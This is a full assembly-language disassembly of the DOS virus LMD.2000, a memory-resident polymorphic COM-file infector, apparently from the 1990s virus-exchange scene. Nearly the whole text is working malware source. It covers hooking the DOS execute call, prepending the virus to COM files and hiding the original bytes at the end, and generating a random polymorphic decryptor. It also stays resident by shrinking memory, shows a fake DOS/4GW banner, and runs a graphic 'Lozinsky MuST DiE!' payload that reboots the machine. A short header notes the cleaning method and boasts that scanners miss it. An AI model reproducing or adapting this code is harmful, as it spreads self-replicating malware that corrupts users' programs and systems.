; LMD.2000

; Resident Polymorphic COM Infector
; Virus Reroutes Int 21h Handler through Int 84h and uses Int 84h for
; virus function calls.  Int 21h Function 4Bh (Set Execution State) is hooked
; for infection routine.  Virus prepends its body to files and writes 2000
; original bytes to end of file.  Polymorphic routine makes 128 random
; one byte instructions and then fills in crypt information.

; Cleaning Instructions - Overwrite First 2000 Bytes with Last 2000 Bytes
; Detection - No scanners detect this beastie yet.

; Research and Disassembly by PakiLad 05/03/97

p386n


seg000		segment	byte public 'CODE' use16
		assume cs:seg000
		org 100h
		assume es:nothing, ss:nothing, ds:seg000, fs:nothing, gs:nothing

start:  
                db      128 dup (90h)   ; Buffer For Cryptor
CryptedCode:
		jmp	VirusStart
OneByteTable    db 26h                  ; SEGES
		db 27h			; DAA
		db 2Eh			; SEGCS
		db 2Fh			; DAS
		db 0FBh			; STI
		db 37h			; AAA
		db 3Eh			; SEGDS
		db 3Fh			; AAS
		db 40h			; INC AX
		db 42h			; INC DX
		db 46h			; INC SI
		db 48h			; DEC AX
		db 4Ah			; DEC DX
		db 4Eh			; DEC SI
		db 90h			; NOP
		db 92h			; XCHG AX, DX
InfMarker       db 'LMD'                

GetRand15       proc near               
		push	cx
		in	ax, 40h		; Get Random Number
		xchg	ax, cx

MakeRandLoop:                           
		xor	ax, cx
		loop	MakeRandLoop
		xchg	ax, cx
		in	ax, 40h		; Get Random Number
		inc	cx
		xor	ax, cx
		and	ax, 0Fh		; Number 0 - 15
		pop	cx
		retn	
GetRand15	endp

GetOneByteIns   proc near            
		push	di
		mov	di, offset OneByteTable
		call	GetRand15
		add	di, ax
		mov	al, cs:[di]
		pop	di
		retn	
GetOneByteIns	endp

CopyOverVir     proc near   
		push	bx
		push	es
		push	ds
		nop	
		push	cs
		pop	es		; ES = CS
		assume es:seg000
		mov	di, offset Buffer+10h
		mov	si, offset start + 10h
		mov	cx, 2000
		rep movsb
		push	ds
		pop	ax
		add	ax, 126
		mov	[RestoreSeg + 10h], ax
		mov	al, [LastByte +	10h]
		push	ax
		push	cs
		mov	ax, offset StoreLastByte + 10h
		push	ax
		mov	[LastByte + 10h], 0CBh
		jmp	near ptr JMPFarProg
CopyOverVir	endp


StoreLastByte:              
		pop	ax
		pop	ds
		mov	[LastByte + 10h], al
		pop	es
		assume es:nothing
		pop	bx
		retn	

CheckGeneration proc near    
		in	al, 40h		; Get Random Number
		cmp	al, 240		; Below	240?
		jb	RandBelow240	; Yes? Then JMP.
		call	GenerateCryptor
		call	GenerateCryptor
		push	dx
                db      8Dh, 16h, 88h, 02h      ; (FIXUP) LEA DX, OFFSET FAKE4DOSGW
		mov	ah, 9
		int	21h		; Write	Fake Message
		pop	dx

RandBelow240:                
		retn	
CheckGeneration	endp


SetupInt84      proc near 
		push	es
		push	bx
		push	di
		xor	ax, ax
		mov	di, 211h	; Offset of INT	84h
		push	ds
		mov	ds, ax		; DS points to IVT
		assume ds:nothing
		cmp	word ptr [di], 0 ; Is Virus Installed?
		jnz	AlreadyInMem	; Yes? Then JMP.
		mov	ax, 3521h
		int	21h		; Get Int 21h Vectors
		dec	di
		mov	ax, es
		mov	[di], bx	; Set New Int 84h Offset
		inc	di
		inc	di
		mov	[di], ax	; Set New Int 84h Segment
		cmp	ax, ax

AlreadyInMem:             
		pop	ds
		assume ds:seg000
		pop	di
		pop	bx
		pop	es
		retn	
SetupInt84	endp

InstallVirus    proc near   
		push	si
		push	di
		push	bx
		mov	ax, 5803h
		xor	bx, bx
		int	21h		; Get UMB Link Status
		push	es
		push	dx
		mov	ax, 3521h
		int	21h		; Get Int 21h Vectors
		mov	ax, es
		mov	cs:Int21Ofs, bx
		mov	cs:Int21Seg, ax
		push	ds
		push	ds
		pop	ax
		dec	ax
		mov	ds, ax		; DS points to MCB
		assume ds:nothing
		sub	word ptr ds:3, 272 ; Subtract 4352 Bytes
		sub	word ptr ds:12h, 272 ; Subtract	4352 Bytes From	Next Seg
		mov	es, ds:12h	; ES points to Next Segment
		xor	di, di
		xor	si, si
		mov	cx, 2272
		rep movsb		; Copy Virus Into Memory
		xor	ax, ax
		mov	ds, ax		; DS points to IVT
		assume ds:nothing
		sub	word ptr ds:413h, 5 ; Subtract 5k From System Memory
		mov	word ptr es:1, 0 ; Set New PSP Segment
		mov	word ptr es:3, 272 ; Allocate 4352 Bytes
		push	es
		pop	ds		; DS = ES
		assume ds:seg000
		mov	ax, 2521h
		mov	dx, offset NewInt21 + 10h
		int	21h		; Set New Int 21h Vectors
		pop	ds
		pop	dx
		pop	es
		pop	bx
		pop	di
		pop	si
		retn	
InstallVirus	endp

FakeDOS4GW      db 0Ah      
		db 'DOS/4GW Protected Mode Run-time  Version 1.95',0Dh,0Ah
		db 'Copyright (c) Rational Systems, Inc. 1990-1993',0Dh,0Ah
		db 0Dh,0Ah,'$'
JMPFarProg      db 0EAh     
RestoreOfs	dw 100h
RestoreSeg      dw 0        

RestoreRoutine:             
		rep movsb
		pop	di
		pop	si
		pop	cx
		jmp	short $+2
FileSize        dw 0        

NewInt24:                   
		mov	al, 3
		iret	
		db 37h

VirusStart:                 
		call	CheckGeneration
		in	al, 40h		; Get Random Number
		cmp	al, 16		; Above	16?
		ja	NoPayload	; Yes? Then JMP.
		mov	ax, 11h
		int	10h		; Set Video Mode 80x13
		mov	ax, 0A000h
		mov	es, ax		; ES points to Video Memory
		assume es:nothing
		mov	di, 3222h
		mov	si, offset Graphic
		mov	cx, 80

DisplayGraphic:             
		push	cx
		mov	cx, 80

DisplayLine:                
		cmp	cx, 69
		jb	Below69
		mov	al, [si]
		inc	si
		mov	es:[di], al

Below69:                    
		inc	di
		loop	DisplayLine
		pop	cx
		loop	DisplayGraphic
		mov	ah, 9
		mov	dx, offset LozMustDie
		int	21h		; Write	String
		xor	ax, ax
		int	16h		; Wait For KeyPress
		jmp	near ptr Reboot
LozMustDie      db 9,9,0Ah  
		db 9,0Ah
		db 0Ah
		db 0Ah
		db 7,'       Lozinsky MuST DiE!$'

NoPayload:                  
		xor	ax, ax
		call	GenerateCryptor
		call	SetupInt84
		jnz	RestoreProg
		call	InstallVirus

RestoreProg:                
		mov	si, offset start
		mov	di, 0FFFEh
		xor	dx, dx
		push	cx
		push	si
		push	di
		push	cs
		pop	es
		assume es:seg000
		mov	si, offset RestoreRoutine
		mov	di, 0F9h
		mov	cx, 7
		rep movsb		; Copy Restore Routine
		mov	si, [si]
		mov	di, offset start
		add	si, di
		mov	cx, 2000
                db      0E9h,069h,0FDh  ; JMP To Restore Routine

NewInt21:                   
		cmp	ax, 4B00h	; Set Execution	State?
		jz	InfectFile	; Yes? Then JMP.
JMPFar21        db 0EAh     
Int21Ofs        dw 0        
Int21Seg        dw 0        

InfectFile:                 
		pushf	
		push	ax
		push	bx
		push	cx
		push	es
		push	si
		push	di
		push	dx
		push	ds
		push	cs
		pop	ds
		mov	dx, offset NewInt24 + 10h
		mov	ax, 2524h
		int	84h		; Set New Int 24h
		pop	ds
		pop	dx
		push	dx
		push	ds
		mov	ax, 4300h
		push	ax
		int	84h		; Get File Attributes
		pop	ax
		inc	ax
		push	ax
		push	cx
		and	cl, 0D8h
		int	84h		; Clear	File Attributes
		jb	FileProblems	; Problems? Then JMP.
		mov	ax, 3D02h
		int	84h		; Open File
		xchg	ax, bx
		mov	ax, 5700h
		int	84h		; Get File Date/Time
		push	cx
		push	dx
		push	cs
		pop	ds		; DS = CS
		mov	cx, 128
		mov	dx, offset Buffer+10h
		mov	ah, 3Fh
		int	84h		; Read In 128 Bytes
		cmp	cx, ax		; Read 128 ?
		jnz	RestoreTD	; No? Then JMP.
		mov	al, [Buffer+10h]
		cmp	al, 'M'         ; EXE File?
		jz	RestoreTD	; Yes? Then JMP.
		cmp	al, 'Z'         ; EXE File?
		jz	RestoreTD	; Yes? Then JMP.
		call	CheckForMark
		jz	RestoreTD	; Infected Already? Then JMP.
		call	DoInfect
		call	NotBigEnough

RestoreTD:                  
                pop     dx
		pop	cx
		mov	ax, 5701h
		int	84h		; Restore File Date/Time
		mov	ah, 3Eh
		int	84h		; Close	File

FileProblems:             
		pop	cx
		pop	ax
		int	84h		; Restore File Attributes
		pop	ds
		pop	dx
		pop	di
		pop	si
		pop	es
		assume es:nothing
		pop	cx
		pop	bx
		pop	ax
		popf	
		jmp	short near ptr JMPFar21

CheckForMark    proc near     
		push	di
		push	si
		mov	di, offset InfMarker
		mov	cx, 16

FindMark:                     
		mov	al, [di]
		push	cx
		mov	si, offset Buffer+10h
		mov	cx, 128

CheckForMarker:               
		mov	ah, [si]
		cmp	al, ah
		jz	FoundMark
		inc	si
		loop	CheckForMarker
		cmp	ax, cx
		pop	cx
		jmp	short DoneWithMark

FoundMark:                    
		pop	cx
		inc	di
		loop	FindMark
		cmp	ax, ax

DoneWithMark:                 
		pop	si
		pop	di
CheckForMark	endp

NotBigEnough    proc near  
		retn	
NotBigEnough	endp

DoInfect        proc near   
		mov	cx, 1872
		mov	dx, offset OrgProgram+10h
		mov	ah, 3Fh
		int	84h		; Read In 1872 Bytes
		cmp	ax, cx		; Read 1872?
		jnz	NotBigEnough	; No? Then JMP.
		xor	cx, cx
		xor	dx, dx
		mov	ax, 4202h
		int	84h		; Move Pointer to End of File
		jb	NotBigEnough
		cmp	dx, 0		; Over 64k?
		jnz	NotBigEnough	; Yes? Then JMP.
		cmp	ax, 2048	; Under	2048 Bytes?
		jb	NotBigEnough	; Yes? Then JMP.
		cmp	ax, 60000	; Over 60000 Bytes?
		ja	NotBigEnough	; Yes? Then JMP.
		cmp	Buffer+30h, 0
		jz	NotBigEnough
		mov	[FileSize + 10h], ax
		mov	ah, 40h
		mov	dx, offset Buffer+10h
		mov	cx, 2000
		int	84h		; Write	Original Bytes To End of File
		jb	NotBigEnough
		call	CopyOverVir
		xor	cx, cx
		xor	dx, dx
		mov	ax, 4200h
		int	84h		; Move Pointer to Beginning
		mov	ah, 40h
		mov	dx, offset Buffer+10h
		mov	cx, 2000
		int	84h		; Write	Virus to File
		retn	
DoInfect	endp

Graphic		db 0, 30h, 0Bh dup(0), 20h, 2 dup(0), 1Ah, 0FBh, 0EBh, 9Fh, 90h, 4 dup(0)
		db 20h,	2 dup(0), 47h, 2 dup(25h), 0FDh, 0AAh, 4 dup(0), 0E0h, 0, 7, 0FAh
		db 12h,	92h, 22h, 54h, 80h, 3 dup(0), 0C0h, 0Ch, 4, 0, 0A8h, 4Ah, 94h
		db 55h,	40h, 3 dup(0), 0C0h, 8,	0Dh, 5Ah, 45h, 2 dup(55h), 0AAh, 0A0h
		db 3 dup(0), 0C0h, 0FBh, 0F2h, 4, 95h, 54h, 0AAh, 5Dh, 0A0h, 3 dup(0)
		db 0DDh, 80h, 28h, 0A2h, 49h, 2	dup(55h), 2 dup(0AAh), 3 dup(0), 0D7h
		db 0Ah,	2, 19h,	25h, 5Dh, 4Ah, 6Dh, 0A4h, 3 dup(0), 0E6h, 0, 0A8h, 84h
		db 95h,	7Ah, 0AAh, 56h,	0D0h, 3	dup(0),	0C0h, 48h, 2, 59h, 52h,	8Bh, 55h
		db 0BAh, 0AAh, 4 dup(0), 2, 90h, 4, 4Ah, 7Dh, 55h, 6Fh,	64h, 4 dup(0)
		db 24h,	25h, 5Ah, 2 dup(0AAh), 0ABh, 0B5h, 0B0h, 4 dup(0), 3 dup(1), 2Ah
		db 0D5h, 0AAh, 5Ah, 0AAh, 4 dup(0), 40h, 8, 99h, 55h, 5Ah, 0DAh, 0DBh
		db 53h,	4 dup(0), 15h, 52h, 44h, 0AAh, 0ABh, 57h, 0AAh,	0A9h, 80h, 4 dup(0)
		db 89h,	22h, 55h, 6Dh, 55h, 5Eh, 0AAh, 0C0h, 2 dup(0), 4, 42h, 24h, 99h
		db 56h,	0B5h, 56h, 0EAh, 0D1h, 5 dup(0), 91h, 25h, 5Bh,	2 dup(0AAh), 0D5h
		db 4Ah,	40h, 4 dup(0), 8, 81h, 2Ah, 0AAh, 95h, 2Eh, 0E9h, 4 dup(0), 1
		db 45h,	24h, 4,	56h, 0DAh, 0E9h, 54h, 80h, 2 dup(0), 8,	80h, 20h, 0, 21h
		db 55h,	56h, 0DDh, 0B6h, 3 dup(0), 2, 8, 0Ah, 2	dup(0),	2Ah, 0BBh, 0AAh
		db 0D4h, 80h, 4	dup(0),	40h, 44h, 1, 9,	55h, 56h, 0AAh,	40h, 2 dup(0)
		db 8, 5, 1, 0, 80h, 25h, 6Dh, 0BBh, 69h, 3 dup(0), 2, 0, 0Ch, 0A0h, 5
		db 6, 92h, 0C9h, 54h, 4	dup(0),	20h, 26h, 4, 0,	0A0h, 4Ah, 0D4h, 20h, 90h
		db 2 dup(0), 4,	1, 19h,	61h, 0,	9, 24h,	6Bh, 55h, 1, 3 dup(0), 40h, 45h
		db 4, 10h, 0C4h, 49h, 0A4h, 94h, 2Fh, 3	dup(0),	14h, 2Ah, 59h, 0, 20h
		db 0E0h, 4Bh, 68h, 0A5h, 2 dup(0), 2 dup(1), 54h, 0A0h,	1, 48h,	2, 0AAh
		db 0B4h, 32h, 3	dup(0),	20h, 0AAh, 5Ah,	90h, 24h, 5, 0B5h, 0A9h, 55h, 3	dup(0)
		db 8Ah,	55h, 58h, 44h, 92h, 95h, 0AAh, 0A4h, 22h, 3 dup(0), 1, 6Ah, 26h
		db 82h,	4Ch, 6Ah, 16h, 0B4h, 0D4h, 2 dup(0), 1,	55h, 0ADh, 9Ah,	51h, 20h
		db 95h,	0EAh, 0AAh, 0B1h, 3 dup(0), 2, 0AAh, 0BDh, 2Ah,	54h, 56h, 2Ah
		db 0A9h, 59h, 3	dup(0),	15h, 55h, 42h, 0A9h, 25h, 52h, 0D5h, 55h, 0EAh
		db 3 dup(0), 49h, 6Dh, 5Dh, 4Ah, 94h, 0ADh, 2Ah, 49h, 34h, 3 dup(0), 25h
		db 56h,	0A4h, 55h, 6Ah,	0D5h, 0A9h, 25h, 0ABh, 3 dup(0), 55h, 75h, 42h
		db 0Bh,	0C5h, 2Ah, 0D4h, 92h, 0A0h, 2 dup(0), 1, 13h, 0ADh, 59h, 40h, 22h
		db 0D5h, 42h, 0AAh, 47h, 3 dup(0), 4Ah,	0F6h, 0E4h, 2Ah, 95h, 5Ah, 94h
		db 95h,	15h, 3 dup(0), 2Bh, 55h, 0BBh, 89h, 55h, 45h, 8Ah, 54h,	0ABh, 3	dup(0)
		db 9, 2Ah, 86h,	0A4h, 25h, 55h,	51h, 55h, 17h, 3 dup(0), 2, 0, 3Bh, 2 dup(49h)
		db 53h,	0A5h, 55h, 6Ah,	3 dup(0), 40h, 0Ah, 0DDh, 0A5h,	4, 0AAh, 55h, 54h
		db 0AAh, 4 dup(0), 41h,	27h, 51h, 69h, 25h, 0CAh, 0A9h,	50h, 3 dup(0)
		db 9, 2Ah, 0DAh, 0EAh, 0A4h, 0ABh, 12h,	40h, 5 dup(0), 4Ah, 5Fh, 54h, 52h
		db 53h,	55h, 28h, 5 dup(0), 25h, 60h, 0AAh, 0A9h, 49h, 0D4h, 80h, 4 dup(0)
		db 4, 0, 26h, 95h, 2Ah,	0AAh, 69h, 48h,	4 dup(0), 1, 41h, 2 dup(0), 0A9h
		db 29h,	2 dup(24h), 4 dup(0), 10h, 15h,	2 dup(65h), 54h, 0A4h, 52h, 82h
		db 4 dup(0), 2,	0AAh, 0A5h, 90h, 2 dup(0AAh), 29h, 15h,	4 dup(0), 10h
		db 5, 5Ah, 6Ah,	0A1h, 25h, 52h,	51h, 0F8h, 3 dup(0), 1,	20h, 45h, 92h
		db 54h,	92h, 0C4h, 0ABh, 8Fh, 3	dup(0),	8, 15h,	25h, 55h, 25h, 54h, 0A1h
		db 25h,	80h, 3 dup(0), 5, 42h, 0A5h, 6Ah, 0A8h,	12h, 94h, 0A9h,	0C0h, 3	dup(0)
		db 5, 55h, 5Ah,	2 dup(0AAh), 0A4h, 4Ah,	0A9h, 0C0h, 3 dup(0), 11h, 55h
		db 0A5h, 2 dup(0AAh), 49h, 0AAh, 0A3h, 0E0h, 3 dup(0), 4, 0AAh,	0A6h, 0B5h
		db 55h,	23h, 0D5h, 55h,	0E0h, 3	dup(0),	2, 2Dh,	0BAh, 0AAh, 0A2h, 4Ah
		db 54h,	0A3h, 0E0h, 3 dup(0), 8, 0A5h, 5Ah, 0A4h, 94h, 25h, 0AAh, 0ABh
		db 0E0h, 3 dup(0), 1, 2Ah, 0A5h, 52h, 41h, 56h,	55h, 57h, 0F0h,	4 dup(0)
		db 25h,	59h, 24h, 14h, 8Ah, 55h, 57h, 0F0h, 4 dup(0), 40h, 22h,	40h, 82h
		db 5Dh,	0AAh, 0AFh, 0F8h, 4 dup(0), 9, 4, 10h, 11h, 6Ah, 55h, 5Fh, 0F8h
		db 6 dup(0), 1,	4Ah, 0ADh, 0D5h, 3Fh, 0F8h, 6 dup(0), 4, 0AEh, 0AAh, 2Ah
		db 0BFh, 0F8h, 6 dup(0), 15h, 2Ah, 0D5h, 0AAh, 7Fh, 0F8h, 5 dup(0), 20h
		db 0A2h, 55h, 2Ah, 54h,	0FFh, 0F8h, 4 dup(0), 3, 0FCh, 49h, 2Ah, 0AAh
		db 53h,	0FFh, 0F8h, 4 dup(0), 3, 0FEh, 92h, 91h, 55h, 0A3h, 0FFh, 0F8h
		db 4 dup(0), 3,	0FFh, 48h, 4Dh,	4Ah, 4Fh, 0FFh,	0F8h, 4	dup(0),	3, 0FFh
		db 0A5h, 25h, 55h, 9Bh,	0DDh, 18h, 4 dup(0), 3,	0FFh, 0D4h, 0AAh, 0A8h
		db 7Bh,	0C9h, 68h, 4 dup(0), 3,	0FFh, 0FAh, 44h, 0A5h, 0FBh, 0C1h, 68h
		db 4 dup(0), 3,	0FFh, 0FAh, 95h, 53h, 0FBh, 55h, 68h, 4	dup(0),	3, 2 dup(0FFh)
		db 52h,	8Fh, 0F8h, 5Dh,	18h, 4 dup(0), 3, 2 dup(0FFh), 0A4h, 5Fh, 2 dup(0FFh)
		db 0F8h, 0, 0Bh	dup(0FFh)
Reboot          db 0EAh                ; Reboot Computer
		dw 0
		dw 0FFFFh

GenerateCryptor proc near   
		push	di
		push	ds
		push	cs
		pop	ds
		mov	di, offset start
		mov	cx, 128
		push	di

FillWithOneByte:      
		call	GetOneByteIns
		mov	[di], al
		inc	di
		loop	FillWithOneByte
		pop	di
		call	GetRand15
		add	di, ax
		mov	byte ptr [di], 0BBh ; Store MOV	BX Instruction
		add	di, 3
		call	GetRand15
		add	di, ax
		mov	word ptr [di], 0A8B9h ;	Store MOV CX, Instruction
		inc	di
		inc	di
		mov	byte ptr [di], 3 ; Store Decrypt Size
		inc	di
		call	GetRand15
		add	di, ax
		mov	word ptr [di], 80BFh ; Store MOV DI
		inc	di
		inc	di
		mov	byte ptr [di], 1 ; Store Offset	of Crypted Code
		inc	di
		call	GetRand15
		add	di, ax
		push	di
		mov	word ptr [di], 312Eh ; XOR [DI],
		inc	di
		inc	di
		mov	byte ptr [di], 1Dh ; BX
		inc	di
		call	GetRand15
		add	di, ax
		mov	word ptr [di], 4747h ; INC SI/INC SI
		inc	di
		inc	di
		mov	byte ptr [di], 43h ; INC AX
		inc	di
		call	GetRand15
		add	di, ax
		mov	byte ptr [di], 0E2h ; LOOP Instruction
		pop	ax
		push	di
		sub	di, ax
		mov	ax, 0FFFEh
		sub	ax, di
		pop	di
		inc	di
		mov	[di], al	; Loop Offset
		pop	ds
		pop	di
		retn	
GenerateCryptor	endp

Buffer          db 0CDh, 20h, 125 dup (0)
LastByte        db 0
OrgProgram      db 1872 dup (0)
seg000		ends


		end start
